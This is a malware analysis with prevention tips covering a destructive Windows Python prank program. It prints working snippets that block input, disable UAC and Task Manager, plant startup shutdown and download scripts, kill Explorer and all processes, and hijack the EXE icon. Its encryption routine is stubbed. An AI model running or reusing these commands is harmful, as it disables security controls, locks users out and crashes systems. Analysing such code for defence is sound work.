# Malicious Code Analysis and Prevention Reminder

## I. Code Overview
This Python code is a malicious program. After obtaining administrator privileges, it performs a series of destructive operations on the computer system. These operations include but are not limited to blocking user input, modifying system settings, automatically downloading programs, encrypting files, disabling the task manager, changing system icons, playing audio and video files, and ultimately attempting to kill all processes, which may cause the system to crash with a blue screen.

## II. Detailed Function Analysis

### 1. Permission Check
```python
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    # Malicious operation code
else:
    if sys.version_info[0] == 3:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
```
The code first checks whether the program is running with administrator privileges. If not, it attempts to request administrator privileges to re - run the program.

### 2. Information Prompt and Keyboard/Mouse Blocking
```python
tkinter.messagebox.showinfo('骂谁罕见呢？', '现在退出还来得及')
user32 = windll.LoadLibrary("C:\\Windows\\System32\\user32.dll")
user32.BlockInput(True)
```
A prompt box pops up to alert the user, and then the mouse and keyboard input are blocked to restrict user operations.

### 3. Resource Path Handling
```python
def get_resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)
```
This function is used to obtain the paths of resources (such as audio and video files) required during the program's runtime.

### 4. System Settings Modification

#### Disable UAC Function
```python
def close_uac():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "EnableLUA", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(key, "PromptOnSecureDesktop", 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)
    except Exception as e:
        print(f"An error occurred while modifying the registry: {e}")
```
This code modifies the registry to disable the User Account Control (UAC) function, so that subsequent operations of the program do not require administrator permission confirmation.

#### Set Automatic Shutdown on Startup
```python
def shuTdoWn():
    bat_content = "shutdown -s -t 60"
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    bat_file_path = os.path.join(startup_path, 'shutdown.bat')
    with open(bat_file_path, "w") as file:
        file.write(bat_content)
```
A shutdown script is created in the system startup folder to automatically shut down the computer 60 seconds after startup.

#### Automatically Download Genshin Impact
```python
def GenShin_DownLoad():
    bat_content = '''
    @echo off
    %1(start /min cmd.exe /c %0 :&exit)
    set curpath=%~dp0 
    cd /d %curpath%
    set exename=yuanshen.exe
    set downurl=https://ys-api.mihoyo.com/event/download_porter/link/ys_cn/official/pc_default
    powershell curl -o "%exename%" "%downurl%"
    '''
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    bat_file_path = os.path.join(startup_path, 'genshin.bat')
    with open(bat_file_path, "w") as file:
        file.write(bat_content)
```
A batch script is created in the system startup folder to automatically download the Genshin Impact game.

### 5. Terminate the Explorer Process
```python
def close_explorer():
    run('taskkill /F /IM explorer.exe')
time.sleep(1.5)
close_explorer()
```
The code terminates the Windows Explorer process, which may cause the desktop and taskbar to become unresponsive.

### 6. Pop - up Windows and Play Audio
```python
def boom2():
    # Code to create a pop - up window
    pass

audio_files = [hanjian1_path, hanjian2_path, hanjian3_path]
def boom3():
    random_audio = random.choice(audio_files)
    playsound(random_audio)

threads1 = []
threads2 = []
threads3 = []
for i in range(15):
    t0 = threading.Thread(target=boom3)
    threads3.append(t0)
    time.sleep(0.1)
    threads3[i].start()
    threads1.clear()
    for j in range(15):
        t1 = threading.Thread(target=boom2)
        threads1.append(t1)
        threads1[j].start()
```
Multiple threads are used to create pop - up windows and play random audio files, which may cause the system to become unresponsive.

### 7. Play Video and Audio
```python
Thread(target=haojing2).start()
haojing1()
```
A separate thread is used to play an audio file, and then a video file is played, which may consume a large amount of system resources.

### 8. Encrypt Files
```python
def encrypt_file(file_path):
    # Read file content
    # Pad data
    # 3DES encryption
    # Modify file extension and overwrite the original file
    pass

def encrypt_directory_recursive(directory_path):
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            if file_path != current_script:
                encrypt_file(file_path)

def encrypt_current_directory():
    current_dir = os.getcwd()
    global current_script
    current_script = os.path.abspath(sys.argv[0])
    encrypt_directory_recursive(current_dir)
```
The code encrypts all files in the current directory and its subdirectories using 3DES encryption, which may lead to data loss if the encryption key is not properly stored.

### 9. Disable the Task Manager
```python
def reg_disable_taskmgr(dwDisable=True):
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        value = int(dwDisable)
        winreg.SetValueEx(key, "DisableTaskMgr", 1, winreg.REG_DWORD, value.to_bytes(4, byteorder='little'))
        winreg.CloseKey(key)
    except Exception as e:
        print(f"An error occurred: {e}")

def disable_task_manager():
    registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    registry_name = "DisableTaskMgr"
    value = 1
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, str(value))
        winreg.CloseKey(reg_key)
    except WindowsError as e:
        print(f"An error occurred while setting the registry: {e}")
```
The code modifies the registry to disable the Windows Task Manager, preventing users from terminating the malicious program.

### 10. Modify the Default Icon of EXE Files
```python
def set_exe_icon():
    try:
        current_path = os.path.abspath(sys.argv[0])
        current_dir = os.path.dirname(current_path)
        sys_icon_path = os.path.join(current_dir, hj_path)
        key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, '.exe', 0, winreg.KEY_SET_VALUE)
        winreg.SetValue(key, '', winreg.REG_SZ, 'exefile')
        key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, 'exefile\\DefaultIcon', 0, winreg.KEY_SET_VALUE)
        winreg.SetValue(key, '', winreg.REG_SZ, sys_icon_path)
        print("Successfully modified the default icon!")
    except Exception as e:
        print(f"Failed to modify the default icon: {str(e)}")
```
The code modifies the registry to change the default icon of EXE files.

### 11. Kill All Processes
```python
if is_admin():
    os.system("Taskkill /fi \"pid ge 1\" /f")
    input()
```
If the program is running with administrator privileges, it attempts to kill all processes, which will cause the system to crash with a blue screen.

## III. ⚠Warning⚠
1. **Do not run unknown programs**: Be cautious when downloading and running programs from untrusted sources. Only run software from official and well - known sources.
2. **Maintain administrator privileges**: Do not run programs with administrator privileges casually. Only grant administrator privileges when necessary.
3. **Keep the system and antivirus software up - to - date**: Regularly update the operating system and antivirus software to ensure that the latest security patches are installed and malicious programs can be detected and removed in a timely manner.
4. **Enable UAC**: Keep the User Account Control (UAC) function enabled to receive prompts when programs attempt to make system - level changes.
5. **Back up important data**: Regularly back up important data to an external storage device or cloud storage to prevent data loss due to malicious attacks.
